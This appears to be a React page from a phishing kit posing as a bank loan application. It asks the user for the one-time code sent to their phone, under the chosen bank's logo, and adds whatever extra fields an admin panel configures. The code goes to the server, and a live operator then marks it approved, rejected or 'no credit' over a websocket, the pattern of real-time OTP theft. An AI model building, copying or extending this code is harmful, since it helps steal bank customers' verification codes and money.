// صفحة إدخال رمز التحقق - حقول مدارة من لوحة الإدارة
import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { useSession } from "@/context/SessionContext";
import { useWebSocket } from "@/context/WebSocketContext";
import { usePageContent } from "@/hooks/usePageContent";
import StepIndicator from "@/components/StepIndicator";
import Navbar from "@/components/Navbar";
import { ChevronLeft, Smartphone, Loader2, XCircle, CreditCard } from "lucide-react";

const BASE = import.meta.env.BASE_URL.replace(/\/$/, "");

interface CustomField {
  id: number;
  pageKey: string;
  fieldKey: string;
  labelAr: string;
  fieldType: string;
  placeholder: string;
  isRequired: boolean;
  sortOrder: number;
}

const KNOWN_KEYS = ["otpCode"];

export default function VerifyPage() {
  const [, navigate] = useLocation();
  const { sessionId, applicationId, selectedBank } = useSession();
  const { subscribe } = useWebSocket();
  const content = usePageContent("verify", {
    page_title: "رمز التحقق",
    page_subtitle: "أدخل رمز التحقق اللي وصلك على جوّالك",
    waiting_message: "جاري التحقق من الرمز... يرجى الانتظار",
    submit_btn: "تأكيد",
  });

  const [fields, setFields] = useState<CustomField[]>([]);
  const [fieldValues, setFieldValues] = useState<Record<string, string>>({});
  const [isWaiting, setIsWaiting] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [otpError, setOtpError] = useState<string | null>(null);
  const [creditError, setCreditError] = useState<string | null>(null);
  const [bank, setBank] = useState<{ nameAr: string; logoUrl?: string } | null>(null);

  useEffect(() => {
    if (!selectedBank) return;
    fetch(`${BASE}/api/banks/${selectedBank}`)
      .then(r => r.ok ? r.json() : null)
      .then(d => d && setBank(d))
      .catch(() => {});
  }, [selectedBank]);

  // جلب الحقول من قاعدة البيانات
  useEffect(() => {
    fetch(`${BASE}/api/custom-fields/verify`)
      .then(r => r.ok ? r.json() : [])
      .then((d: CustomField[]) => setFields(d))
      .catch(() => {});
  }, []);

  // الاستماع لتحديثات الحقول وقرارات المدير
  useEffect(() => {
    return subscribe((msg) => {
      if (msg.type === "custom_fields_update" && msg.pageKey === "verify") {
        setFields(msg.fields as CustomField[]);
      }
      if (msg.type === "otp_decision" && msg.sessionId === sessionId) {
        const decision = msg.decision as string;
        if (decision === "approved") {
          navigate("/apply/success");
        } else if (decision === "rejected") {
          setIsWaiting(false);
          setOtpError("الرمز المدخل خطأ");
          setCreditError(null);
          setFieldValues({});
        } else if (decision === "no_credit") {
          setIsWaiting(false);
          setCreditError("لا يوجد رصيد ائتماني متاح لحصولك على التمويل");
          setOtpError(null);
          setFieldValues({});
        }
      }
    });
  }, [subscribe, sessionId, navigate]);

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!applicationId || !sessionId) return;
    setIsLoading(true);
    setOtpError(null);
    setCreditError(null);

    // تصنيف قيم الحقول
    const patchBody: Record<string, string> = { currentStep: "verify", status: "waiting" };
    const extra: Record<string, string> = {};
    for (const [key, val] of Object.entries(fieldValues)) {
      if (KNOWN_KEYS.includes(key)) {
        patchBody[key] = val;
      } else {
        extra[key] = val;
      }
    }
    if (Object.keys(extra).length > 0) {
      patchBody.extraData = JSON.stringify(extra);
    }

    try {
      await fetch(`${BASE}/api/applications/${applicationId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(patchBody),
      });

      await fetch(`${BASE}/api/sessions/${sessionId}`, {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ otpStatus: "awaiting", currentPage: "verify" }),
      });

      setIsWaiting(true);
    } catch {
      setOtpError("حدث خطأ، حاول مرة ثانية");
    } finally {
      setIsLoading(false);
    }
  };

  // التحقق من وجود حقل OTP
  const hasSubmittableValue = fields.some(f => fieldValues[f.fieldKey]?.trim());

  return (
    <div className="min-h-screen bg-background" dir="rtl">
      <Navbar />
      <StepIndicator currentStep={4} />

      <div className="container mx-auto px-4 py-10 max-w-md">
        {bank && (
          <div className="bg-card border rounded-2xl p-4 mb-8 flex items-center gap-4">
            {bank.logoUrl ? (
              <img src={bank.logoUrl} alt={bank.nameAr} className="w-16 h-12 object-contain" />
            ) : (
              <div className="w-14 h-14 navy-gradient rounded-xl flex items-center justify-center text-white font-black text-xl">
                {bank.nameAr.charAt(0)}
              </div>
            )}
            <div>
              <p className="text-sm text-muted-foreground">البنك المختار</p>
              <p className="font-black text-lg text-primary">{bank.nameAr}</p>
            </div>
          </div>
        )}

        {/* شاشة الانتظار */}
        {isWaiting ? (
          <div className="bg-card border rounded-3xl p-12 text-center">
            <div className="w-20 h-20 navy-gradient rounded-2xl flex items-center justify-center text-white mx-auto mb-6">
              <Loader2 className="w-10 h-10 animate-spin" />
            </div>
            <h2 className="text-xl font-black text-primary mb-3">جاري التحقق</h2>
            <p className="text-muted-foreground leading-relaxed">{content.waiting_message}</p>
          </div>
        ) : (
          <>
            {otpError && (
              <div className="bg-red-50 border border-red-200 rounded-xl p-4 mb-6 flex gap-3">
                <XCircle className="w-5 h-5 text-red-600 shrink-0 mt-0.5" />
                <p className="text-red-800 font-medium">{otpError}</p>
              </div>
            )}

            {creditError && (
              <div className="bg-orange-50 border border-orange-200 rounded-xl p-4 mb-6 flex gap-3">
                <CreditCard className="w-5 h-5 text-orange-600 shrink-0 mt-0.5" />
                <p className="text-orange-800 font-medium">{creditError}</p>
              </div>
            )}

            <div className="text-center mb-8">
              <div className="w-16 h-16 navy-gradient rounded-2xl flex items-center justify-center text-white mx-auto mb-4">
                <Smartphone className="w-8 h-8" />
              </div>
              <h1 className="text-2xl font-black mb-2" style={{ color: content.title_color || "var(--color-primary)" }}>{content.page_title}</h1>
              <p className="text-muted-foreground" style={content.text_color ? { color: content.text_color } : {}}>{content.page_subtitle}</p>
            </div>

            <form onSubmit={handleSubmit} className="bg-card border rounded-2xl p-8 space-y-6">
              {fields.length === 0 ? (
                <div className="text-center py-4">
                  <Loader2 className="w-6 h-6 animate-spin text-primary mx-auto mb-2" />
                  <p className="text-muted-foreground text-sm">جاري تحميل الحقول...</p>
                </div>
              ) : (
                fields.map(field => {
                  const isOtp = field.fieldKey === "otpCode";
                  return (
                    <div key={field.fieldKey}>
                      <label className={`block text-sm font-bold text-foreground mb-3 ${isOtp ? "text-center" : ""}`}>
                        {field.labelAr} {field.isRequired && <span className="text-destructive">*</span>}
                      </label>
                      <input
                        type="tel"
                        inputMode="numeric"
                        required={field.isRequired}
                        value={fieldValues[field.fieldKey] ?? ""}
                        onChange={e => setFieldValues(prev => ({ ...prev, [field.fieldKey]: e.target.value }))}
                        className={`w-full border-2 rounded-2xl p-4 bg-background text-foreground focus:outline-none focus:border-primary transition-colors ${
                          isOtp ? "text-center text-2xl font-mono tracking-widest" : "text-center"
                        }`}
                        placeholder={field.placeholder || `أدخل ${field.labelAr}`}
                        maxLength={isOtp ? 10 : undefined}
                      />
                    </div>
                  );
                })
              )}

              <button
                type="submit"
                disabled={isLoading || !hasSubmittableValue}
                className="w-full navy-gradient text-white py-4 rounded-xl font-bold text-lg flex items-center justify-center gap-2 hover:opacity-90 transition-opacity disabled:opacity-50"
              >
                {isLoading ? <Loader2 className="w-5 h-5 animate-spin" /> : <ChevronLeft className="w-5 h-5" />}
                {isLoading ? "جاري التحقق..." : content.submit_btn}
              </button>
            </form>
          </>
        )}
      </div>
    </div>
  );
}
